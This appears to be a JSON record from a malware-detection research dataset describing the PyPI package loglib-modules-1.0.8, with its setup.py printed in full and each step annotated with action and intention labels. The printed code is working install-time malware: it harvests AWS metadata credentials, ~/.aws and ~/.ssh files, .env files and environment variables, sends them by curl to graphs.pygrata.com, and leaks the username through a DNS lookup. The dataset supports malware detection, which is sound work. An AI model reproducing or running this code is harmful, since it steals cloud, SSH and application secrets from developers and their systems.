{
  "metadata": {
    "package_name": "loglib-modules-1.0.8",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/loglib-modules-1.0.8.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/loglib-modules-1.0.8.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import random\nimport socket\nimport getpass\nimport base64\nimport subprocess\nimport os\nimport binascii\n\nacmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/'\nbcmd = 'cd ~/.aws && cat credentials'\nccmd = 'env'\ncdcmd = 'cd ~/.ssh && ls && cat *'\nipcmd = 'ip addr show'\ncatenvcmd = 'cd ~/ && ls .env* && cat .env*'\nres3 = \"\"\nall3 = \"\"\nall4 = \"\"\nall5 = \"\"\nall6 = \"\"\nall7 = \"\"\ngetcred = \"\"\n\ntry:\n    result = subprocess.getoutput(acmd)\n    rolename = str(result).split('instance-profile/')[1].split('\",')[0]\n    accmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/' + rolename + '/'\n    getcred = subprocess.getoutput(accmd)\n    all3 = \"metadata \\n ----------------------------------------- \\n \\n\" + result + getcred\nexcept Exception as e:\n    pass\ntry:\n    result2 = subprocess.getoutput(bcmd)\n    all4 = \" \\n \\n a \\n ----------------------------------------- \\n \\n\" + result2\nexcept Exception as e:\n    pass\ntry:\n    hostname = \"\"\n    username = \"\"\n    cwd = \"\"\n    ipadd = \"\"\n    try:\n        hostname = socket.gethostname()\n    except Exception as e:\n        pass\n    try:\n        username = getpass.getuser()\n    except Exception as e:\n        pass\n    try:\n        cwd = os.getcwd()\n    except Exception as e:\n        pass\n    try:\n        ipadd = subprocess.getoutput(ipcmd)\n    except Exception as e:\n        pass\n    res3 = {'hostname':hostname,'cwd':cwd,'username':username,'IP':ipadd}\n    all5 = \"\\n \\n details \\n ----------------------------------------- \\n \\n \" + str(res3)\nexcept Exception as e:\n    pass\ntry:\n    result3 = subprocess.getoutput(ccmd)\n    all6 = \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + result3\nexcept Exception as e:\n    pass\ntry:\n    result4 = subprocess.getoutput(cdcmd)\n    all7 = \"\\n \\n ssh \\n ----------------------------------------- \\n \\n \" + result4\nexcept Exception as e:\n    pass\n\nall8 = str(all3) + str(all4) + str(all5) + str(all6) + str(all7)\nif os.path.exists('.env') or os.path.exists('/root/.env') or os.path.exists('/home/*/.env'):\n    output = subprocess.getoutput(catenvcmd)\n    allen = all8 + \"\\n \\n en \\n ----------------------------------------- \\n \\n \" + str(output)\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(allen + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + allen + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')\nelse:\n    filename1 = str(random.randint(0, 99999999999)) + '.txt'\n    filename2 = str(filename1)\n    with open(filename2, 'a') as d:\n        d.write(all8 + '\\n')\n    subprocess.getoutput(\"curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@\" + filename2 + \"' -F 'submit=Upload'\")\n    subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=' + all8 + '\"')\n    os.remove(filename2)\n    usern = getpass.getuser()\n    userb64 = base64.b64encode(usern.encode()).decode()\n    hexb64 = binascii.hexlify(base64.b64decode(userb64))\n    hexusern = hexb64.decode(\"utf-8\")\n    subprocess.getoutput('dig ' + hexusern + 'isuser.api.pygrata.com')",
          "triple_sequences": [
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "str.split()",
              "action_description": "Basic string operations (splitting and joining strings)",
              "action_id": "path_string_operations",
              "object": "result.split('instance-profile/')[1].split('\",')[0]",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cd ~/.aws && cat credentials",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "ip addr show",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Collect IP address",
              "intention_id": "collect_ip_address"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "env",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cd ~/.ssh && ls && cat *",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access system credential file",
              "intention_id": "access_system_credential_file"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": ".env",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "/root/.env",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "/home/*/.env",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "cd ~/ && ls .env* && cat .env*",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "random.randint()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "0, 99999999999",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Create random file name",
              "intention_id": "create_random_filename"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "filename2, 'a'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "allen + '\\n'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "curl -X POST http://graphs.pygrata.com/uploader.php -F 'uploaded_file=@",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "curl -X POST http://graphs.pygrata.com/api.php -d \"textdata=",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "filename2",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "usern.encode()",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "base64.b64encode()",
              "action_description": "Encodes bytes to base64-encoded bytes",
              "action_id": "encode_bytes_to_base64",
              "object": "usern.encode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Prepare data for base64 encoding",
              "intention_id": "prepare_data_base64_encoding"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "userb64",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "binascii.hexlify()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "base64.b64decode(userb64)",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "hexb64.decode(\"utf-8\")",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "subprocess.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "dig ",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Send DNS request",
              "intention_id": "send_dns_request"
            }
          ]
        }
      ]
    }
  ]
}